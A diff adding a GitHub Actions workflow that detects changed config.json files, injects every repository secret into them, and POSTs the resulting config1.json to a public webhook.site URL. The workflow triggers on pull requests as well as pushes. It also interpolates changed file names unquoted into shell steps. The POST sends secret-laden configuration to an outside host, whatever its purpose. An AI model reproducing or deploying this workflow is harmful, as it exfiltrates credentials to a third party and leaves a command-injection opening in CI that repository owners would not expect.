@@ -1,0 +1,111 @@
+# This is a basic workflow to help you get started with Actions
+name: Publish Config Updates
+
+# Controls when the workflow will run
+on:  
+ # Triggers the workflow on push or pull request events but only for the "main" branch
+  push:
+   branches: [ "main" ]
+  pull_request:
+   branches: [ "main" ]
+
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+jobs:
+  # This workflow contains a single job called "build"
+  changed-files:
+    name: Get changed configs
+
+    runs-on: ubuntu-latest
+
+    outputs:
+      matrix: ${{ steps.set-matrix.outputs.matrix }}
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Get changed files
+        id: changed-files
+        uses: ./
+        with:
+          files: '**config.json'
+          json: true
+          quotepath: false
+
+      - name: List all changed files
+        run: echo '${{ steps.changed-files.outputs.all_changed_files }}'
+
+      - id: set-matrix
+        run: echo "matrix={\"files\":${{ steps.changed-files.outputs.all_changed_files }}}" >> "$GITHUB_OUTPUT"
+  
+  matrix-job:
+    name: Run Matrix Job
+    runs-on: ubuntu-latest
+    needs: [changed-files]
+    strategy:
+      matrix: ${{ fromJSON(needs.changed-files.outputs.matrix) }}
+      max-parallel: 4
+      fail-fast: false
+    steps:
+
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Test
+        run: |
+          echo ${{ matrix.files }}
+
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v3
+
+      - name: Substitute Secrets
+        uses: Lambdaspire/action-substitute-secrets-in-file@v1.0.0
+        with:
+
+          # The (single) file to target.
+          file: ${{ matrix.files }}
+      
+          # The (single) file output.
+          # Optional - defaults to same as ":"file"
+          output: ${{ matrix.files }}
+      
+          # The token pattern.
+          # Must include the string "TOKEN".
+          # e.g.
+          #   ${TOKEN}
+          #   #{TOKEN}#
+          #   <TOKEN/>
+          #   <!-- TOKEN -->
+          tokenPattern: ${TOKEN}
+      
+          # Passes GitHub Secrets as a JSON string to the action.
+          # This MUST be supplied.
+          # It MUST be exactly "${{ toJSON(secrets) }}".
+          secretsJson: ${{ toJSON(secrets) }}
+
+      - name: Read JSON file
+        id: read-json
+        run: |
+          echo 'CONFIG_JSON<<EOF' >> $GITHUB_ENV
+          cat ./config1.json >> $GITHUB_ENV
+          echo 'EOF' >> $GITHUB_ENV
+        
+      - name: HTTP Request Action
+        # You may pin to the exact commit or the version.
+        # uses: fjogeleit/http-request-action@eab8015483ccea148feff7b1c65f320805ddc2bf
+        uses: fjogeleit/http-request-action@v1
+        with:
+          # Request URL
+          url: 'https://webhook.site/c33c6f62-9347-46d2-8e88-218eeeee7464'
+          # Request Method
+          method: 'POST'
+          # Content Type
+          customHeaders: '{"Content-Type": "application/json"}'
+          #payload
+          data: '${{ env.CONFIG_JSON }}'
+          
+        
+
+      
